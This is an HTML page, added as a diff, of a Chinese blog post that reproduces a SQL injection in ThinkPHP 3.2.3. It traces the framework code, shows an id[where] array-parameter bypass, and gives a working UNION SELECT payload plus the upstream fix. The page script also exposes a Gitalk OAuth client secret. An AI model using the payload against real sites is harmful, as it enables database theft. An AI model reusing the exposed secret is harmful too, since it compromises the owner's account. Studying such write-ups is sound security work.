@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ThinkPHP3.2.3]SQL注入漏洞复现 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="前言
+Thinkphp3中特有的字母函数
+https://www.cnblogs.com/kenshinobiy/p/9165662.html
+M实例化一个没有模型文件的Model,实例化参数是数据库的表名。
+I表示Input，主要用于更加..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ThinkPHP3.2.3]SQL注入漏洞复现</h2>
+            <div class="post-date">2024-04-01</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="前言">前言</h1>
+<p>Thinkphp3中特有的字母函数<br>
+https://www.cnblogs.com/kenshinobiy/p/9165662.html</p>
+<p>M实例化一个没有模型文件的Model,实例化参数是数据库的表名。<br>
+I表示Input，主要用于更加方便和安全的获取系统输入变量。</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>使用<code>composer</code>一键下载</p>
+<pre><code>composer create-project topthink/thinkphp=3.2.3 tp3.2.3
+</code></pre>
+<p>编写controller<br>
+<code>Application/Home/Controller/SearchController.class.php</code><br>
+<img src="https://fallingskies22.github.io/post-images/1711971035034.png" alt="" loading="lazy"></p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+
+use Think\Controller;
+
+class SearchController extends Controller
+{
+    public function index()
+    {
+        $data = M('users')-&gt;find(I('GET.id'));
+        var_dump($data);
+    }
+}
+</code></pre>
+<p>配置数据库信息<br>
+<code>Application/Home/Conf/config.php</code><br>
+<img src="https://fallingskies22.github.io/post-images/1711971040440.png" alt="" loading="lazy"></p>
+<pre><code class="language-php">&lt;?php
+return array(
+	//'配置项'=&gt;'配置值'
+    /* 数据库设置 */
+    'DB_TYPE'                =&gt; 'mysql', // 数据库类型
+    'DB_HOST'                =&gt; 'localhost', // 服务器地址
+    'DB_NAME'                =&gt; 'thinkphp', // 数据库名
+    'DB_USER'                =&gt; 'root', // 用户名
+    'DB_PWD'                 =&gt; 'root', // 密码
+    'DB_PORT'                =&gt; '3306', // 端口
+);
+</code></pre>
+<p>创建数据库</p>
+<pre><code class="language-mysql">CREATE TABLE `thinkphp`.`users`  (
+  `id` int NOT NULL,
+  `username` varchar(255) NULL,
+  `password` varchar(255) NULL,
+  PRIMARY KEY (`id`)
+);
+INSERT INTO `users` (`id`, `username`, `password`) VALUES (1, 'user1', 'password1');
+INSERT INTO `users` (`id`, `username`, `password`) VALUES (2, 'user2', 'password2');
+INSERT INTO `users` (`id`, `username`, `password`) VALUES (3, 'user3', 'password3');
+INSERT INTO `users` (`id`, `username`, `password`) VALUES (4, 'user4', 'password4');
+INSERT INTO `users` (`id`, `username`, `password`) VALUES (5, 'user5', 'password5');
+</code></pre>
+<h1 id="普通传参调试分析">普通传参调试分析</h1>
+<p>访问</p>
+<pre><code>http://localhost/Home/search?id=1'
+</code></pre>
+<p>跟进find函数<br>
+这里的options参数是通过<code>I()</code>函数传入的<br>
+首先判断options是否是数字或者字符</p>
+<pre><code>$options=&quot;1'&quot;
+</code></pre>
+<p>如果是那就将其对应的键值和参数值传入<code>$options['where']</code>中</p>
+<pre><code>$options[where] = {id =&gt; &quot;1'&quot;}
+</code></pre>
+<p>$options参数是Model.class.php中的一个数组，主要存放各种条件参数，如$options['where'],$options['limit']等</p>
+<pre><code class="language-php">    public function find($options = array())
+    {
+        if (is_numeric($options) || is_string($options)) {
+            $where[$this-&gt;getPk()] = $options;   //getPk()获取主键名称
+            $options               = array();
+            $options['where']      = $where;
+        }
+        // 根据复合主键查找记录
+        $pk = $this-&gt;getPk();
+        if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) {
+            // 根据复合主键查询
+            $count = 0;
+            foreach (array_keys($options) as $key) {
+                if (is_int($key)) {
+                    $count++;
+                }
+
+            }
+            if (count($pk) == $count) {
+                $i = 0;
+                foreach ($pk as $field) {
+                    $where[$field] = $options[$i];
+                    unset($options[$i++]);
+                }
+                $options['where'] = $where;
+            } else {
+                return false;
+            }
+        }
+        // 总是查找一条记录
+        $options['limit'] = 1;
+        // 分析表达式
+        $options = $this-&gt;_parseOptions($options);
+        // 判断查询缓存
+        if (isset($options['cache'])) {
+            $cache = $options['cache'];
+            $key   = is_string($cache['key']) ? $cache['key'] : md5(serialize($options));
+            $data  = S($key, '', $cache);
+            if (false !== $data) {
+                $this-&gt;data = $data;
+                return $data;
+            }
+        }
+        $resultSet = $this-&gt;db-&gt;select($options);
+        if (false === $resultSet) {
+            return false;
+        }
+        if (empty($resultSet)) {
+// 查询结果为空
+            return null;
+        }
+        if (is_string($resultSet)) {
+            return $resultSet;
+        }
+
+        // 读取数据后的处理
+        $data = $this-&gt;_read_data($resultSet[0]);
+        $this-&gt;_after_find($data, $options);
+        if (!empty($this-&gt;options['result'])) {
+            return $this-&gt;returnResult($data, $this-&gt;options['result']);
+        }
+        $this-&gt;data = $data;
+        if (isset($cache)) {
+            S($key, $data, $cache);
+        }
+        return $this-&gt;data;
+    }
+</code></pre>
+<p>接下来跟进_parseOptions()函数，显然这是处理$options中参数的函数。<br>
+其中有一段字段类型验证，当<code>$options['where']</code>是数组时，会走到_parseType()函数。</p>
+<pre><code class="language-php"> /**
+     * 分析表达式
+     * @access protected
+     * @param array $options 表达式参数
+     * @return array
+     */
+    protected function _parseOptions($options = array())
+    {
+        if (is_array($options)) {
+            $options = array_merge($this-&gt;options, $options);
+        }
+
+        if (!isset($options['table'])) {
+            // 自动获取表名
+            $options['table'] = $this-&gt;getTableName();
+            $fields           = $this-&gt;fields;
+        } else {
+            // 指定数据表 则重新获取字段列表 但不支持类型检测
+            $fields = $this-&gt;getDbFields();
+        }
+
+        // 数据表别名
+        if (!empty($options['alias'])) {
+            $options['table'] .= ' ' . $options['alias'];
+        }
+        // 记录操作的模型名称
+        $options['model'] = $this-&gt;name;
+
+        // 字段类型验证
+        if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) {
+            // 对数组查询条件进行字段类型检查
+            foreach ($options['where'] as $key =&gt; $val) {
+                $key = trim($key);
+                if (in_array($key, $fields, true)) {
+                    if (is_scalar($val)) {
+                        $this-&gt;_parseType($options['where'], $key);
+                    }
+                } elseif (!is_numeric($key) &amp;&amp; '_' != substr($key, 0, 1) &amp;&amp; false === strpos($key, '.') &amp;&amp; false === strpos($key, '(') &amp;&amp; false === strpos($key, '|') &amp;&amp; false === strpos($key, '&amp;')) {
+                    if (!empty($this-&gt;options['strict'])) {
+                        E(L('_ERROR_QUERY_EXPRESS_') . ':[' . $key . '=&gt;' . $val . ']');
+                    }
+                    unset($options['where'][$key]);
+                }
+            }
+        }
+        // 查询过后清空sql表达式组装 避免影响下次查询
+        $this-&gt;options = array();
+        // 表达式过滤
+        $this-&gt;_options_filter($options);
+        return $options;
+    }
+</code></pre>
+<p>跟进_parseType()函数,获取到数据库中id为int型，所以会将传入参数进行intval()。<br>
+这里会将我们传入的<code>1'</code>转化为<code>1</code>，所以无法注入。</p>
+<pre><code class="language-php">protected function _parseType(&amp;$data, $key)
+    {
+        if (!isset($this-&gt;options['bind'][':' . $key]) &amp;&amp; isset($this-&gt;fields['_type'][$key])) {
+            $fieldType = strtolower($this-&gt;fields['_type'][$key]);
+            if (false !== strpos($fieldType, 'enum')) {
+                // 支持ENUM类型优先检测
+            } elseif (false === strpos($fieldType, 'bigint') &amp;&amp; false !== strpos($fieldType, 'int')) {
+                $data[$key] = intval($data[$key]);
+            } elseif (false !== strpos($fieldType, 'float') || false !== strpos($fieldType, 'double')) {
+                $data[$key] = floatval($data[$key]);
+            } elseif (false !== strpos($fieldType, 'bool')) {
+                $data[$key] = (bool) $data[$key];
+            }
+        }
+    }
+</code></pre>
+<h1 id="漏洞触发点">漏洞触发点</h1>
+<p>使用数组形式传入参数</p>
+<pre><code>http://localhost/index.php/Home/Search/index?id[where]=1'
+</code></pre>
+<p>这里会跳过对$options['where']的赋值，而直接使用我们传入的参数。<br>
+<img src="https://fallingskies22.github.io/post-images/1712031473193.png" alt="" loading="lazy"><br>
+因为$options['where']不再是数组，所以也能跳过字段类型验证。<br>
+<img src="https://fallingskies22.github.io/post-images/1712031477124.png" alt="" loading="lazy"></p>
+<p>可以看到最终生成的sql语句成功保留了引号<br>
+<img src="https://fallingskies22.github.io/post-images/1712032463765.png" alt="" loading="lazy"></p>
+<p>页面报错信息<br>
+<img src="https://fallingskies22.github.io/post-images/1712032523661.png" alt="" loading="lazy"></p>
+<p>利用类似方法还可以使用<code>id[table]</code>,<code>id[alias]</code>等。</p>
+<h1 id="payload">payload</h1>
+<pre><code>id[where]=FALSE union select 1,2,TABLE_NAME from information_schema.tables where table_schema=database()--+
+</code></pre>
+<h1 id="漏洞修复">漏洞修复</h1>
+<p>https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04<br>
+<img src="https://fallingskies22.github.io/post-images/1712033465704.jpg" alt="" loading="lazy"></p>
+<p>将$options和$this-&gt;options进行了区分，从而传入的参数无法污染到$this-&gt;options，也就无法控制sql语句了。</p>
+<h1 id="参考">参考</h1>
+<p>https://y4er.com/posts/thinkphp3-vuln</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowjava/">
+                  <h3 class="post-title">
+                    [ctfshow]JAVA
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
